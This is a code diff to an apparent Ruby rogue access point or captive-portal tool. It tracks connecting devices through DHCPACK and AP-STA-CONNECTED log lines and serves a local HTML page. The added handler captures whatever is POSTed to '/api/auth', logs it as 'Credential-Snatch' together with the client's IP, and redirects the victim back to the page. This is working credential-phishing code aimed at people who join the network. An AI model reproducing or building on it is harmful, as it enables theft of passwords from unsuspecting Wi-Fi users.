@@ -141,7 +141,7 @@ LogThread = Thread.start do
       lastestDns.chomp!
       # Log.debug("DNS: #{lastestDns}") unless lastestDns.empty?
       # next if lastestDns.empty?
-      # puts lastestDns if !lastestDns.empty? 
+      # puts lastestDns if !lastestDns.empty?
       if lastestDns.include?('DHCPACK')
         data = lastestDns.split(' ')
         ip = data[6]
@@ -167,7 +167,7 @@ LogThread = Thread.start do
     next if lastestHost.nil?
 
     lastestHost.chomp!
-    # Log.debug("HOST: #{lastestHost}")
+    Log.debug("HOST: #{lastestHost}") unless lastestHost.empty?
     if lastestHost.include?('AP-STA-CONNECTED')
       data = lastestHost.split(' ')
       mac = data[2]
@@ -185,13 +185,40 @@ httpThread = Thread.start do
   loop do
     Thread.start(handler.accept) do |client|
       read = client.readpartial(2048)
-      puts read
+      # puts read
       request = Codec.decode(read, client.peeraddr[3])
-      puts request.inspect
-      Log.http("#{client.peeraddr[3]}: #{request['Method']} #{request['Path']} #{request['User-Agent']}")
+      # Log.http("#{client.peeraddr[3]}: #{request['Method']} #{request['Path']} #{request['User-Agent']}")
+      if request['Path'] == '/api/auth' && request['Method'] == 'POST'
+        # Log.debug("POST /api/auth")
+        Log.http("#{client.peeraddr[3]}-Credential-Snatch: #{request['Data']}") unless request['Data'].nil?
+
+        client.write(
+          Codec.genRedir(
+            '/'
+          )
+        )
+      else
+        Log.http("#{client.peeraddr[3]}: #{request['Method']} #{request['Path']} (#{request['User-Agent']})") 
+        client.write(
+          Codec.genResponse(
+            '200 OK',
+            'text/html',
+            File.read('src/index.html')
+          )
+        )
+      end
+      client.close
       next
     end
   end
+rescue Exception => e
+  # If error is becuase port is in use, then exit
+  if e.message.include?('in use')
+    Log.error("Failed to start HTTP server: #{e}")
+    exit 1
+  end
+  Log.error("HTTP server error: #{e}")
+  retry
 end
 
 trap('INT') do
